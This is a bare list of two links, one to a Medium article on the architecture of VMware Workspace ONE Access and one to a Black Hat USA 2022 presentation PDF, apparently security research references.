https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd

https://i.blackhat.com/USA-22/Wednesday/US-22-Seeley-IAM-who-I-say-IAM.pdf
